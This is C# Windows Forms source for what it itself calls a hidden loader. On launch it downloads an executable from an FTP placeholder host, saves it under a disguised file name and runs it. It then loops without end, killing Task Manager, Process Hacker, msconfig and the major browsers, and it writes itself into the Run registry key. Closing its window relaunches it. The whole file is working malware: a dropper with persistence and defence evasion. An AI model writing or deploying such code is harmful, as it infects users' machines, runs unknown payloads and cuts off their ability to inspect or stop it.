using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Management;
using System.Diagnostics;
using Microsoft.Win32;

namespace HiddenLoaderWinForms
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            string ftpUserID = "user"; //FTP USER NAME
            string ftpPassword = "pass"; //FTP PASSWORD
            string path = "ftp://site.com/file.exe";
            string to = "D://github.txt"; // Path where to save + file name
            try
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(path);
                request.Method = WebRequestMethods.Ftp.DownloadFile;
                request.Credentials = new NetworkCredential(ftpUserID, ftpPassword);
                FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                FileStream file = File.Create(to);
                byte[] buffer = new byte[512 * 1024];
                int read;
                while ((read = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    file.Write(buffer, 0, read);
                }
                file.Close();
                responseStream.Close();
                response.Close();

            }
            catch (Exception)
            {

            }

            Process.Start(@"D:\github.txt"); // path and name of process what need a start
            const string name = "github.com/tentrun"; //name process in startup (autorun)

            while (true)
            {
                foreach (Process proc in Process.GetProcesses()) // Names of processes to kill
                    if (proc.ProcessName == "Taskmgr" || // Names of processes to kill
                        proc.ProcessName == "ProcessHacker" || // Names of processes to kill
                        proc.ProcessName == "perfmon" || // Names of processes to kill
                        proc.ProcessName == "opera" || // Names of processes to kill
                        proc.ProcessName == "iexplore" || // Names of processes to kill
                        proc.ProcessName == "Firefox" || // Names of processes to kill
                        proc.ProcessName == "chrome" || // Names of processes to kill
                        proc.ProcessName == "msconfig" || // Names of processes to kill
                        proc.ProcessName == "amigo" || //Russian shit browser  
                        proc.ProcessName == "MicrosoftEdge") // Names of processes to kill
                        proc.Kill();
                System.Threading.Thread.Sleep(30);

                string ExePath = System.Windows.Forms.Application.ExecutablePath;
                RegistryKey reg;
                reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                reg.SetValue(name, ExePath);
                reg.Close();
            }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            System.Diagnostics.Process.Start(Application.ExecutablePath);
            Environment.Exit(0);
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }
    }
    }